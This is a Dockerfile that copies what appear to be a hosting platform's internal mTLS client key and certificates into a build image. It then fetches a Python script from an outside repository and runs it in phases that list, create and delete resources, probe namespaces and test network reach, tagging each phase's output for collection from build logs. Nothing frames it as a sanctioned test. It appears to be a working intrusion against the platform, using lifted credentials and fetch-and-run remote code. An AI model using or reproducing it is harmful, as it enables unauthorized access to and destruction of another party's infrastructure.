# MARK-I67987-VMR3-a91c
FROM alpine:3.20
RUN echo MARK-I67987-VMR3-a91c-apk && apk add --no-cache curl openssl python3 >/dev/null 2>&1 && echo APK_OK
COPY var/lib/railwayapp/mtls-pki/client.crt /pki/client.crt
COPY var/lib/railwayapp/mtls-pki/client.key /pki/client.key
COPY var/lib/railwayapp/mtls-pki/server-ca-bundle.crt /pki/server-ca-bundle.crt
RUN echo MARK-I67987-VMR3-a91c-dl && curl -sS -m 30 -o /p.py https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/probe_vmr3.py && wc -l /p.py
RUN echo MARK-I67987-VMR3-a91c-p1 && PHASE=list DEADLINE=240 timeout -s KILL 280 python3 /p.py 2>&1 | head -c 42000
RUN echo MARK-I67987-VMR3-a91c-p2 && PHASE=create DEADLINE=480 timeout -s KILL 500 python3 /p.py 2>&1 | head -c 42000
RUN echo MARK-I67987-VMR3-a91c-p3 && PHASE=delete DEADLINE=480 timeout -s KILL 500 python3 /p.py 2>&1 | head -c 42000
RUN echo MARK-I67987-VMR3-a91c-p4 && PHASE=others DEADLINE=300 timeout -s KILL 320 python3 /p.py 2>&1 | head -c 42000
RUN echo MARK-I67987-VMR3-a91c-p5 && PHASE=ns DEADLINE=260 timeout -s KILL 280 python3 /p.py 2>&1 | head -c 42000
RUN echo MARK-I67987-VMR3-a91c-p6 && PHASE=reach DEADLINE=480 timeout -s KILL 500 python3 /p.py 2>&1 | head -c 42000
CMD ["sh","-c","sleep 1800"]
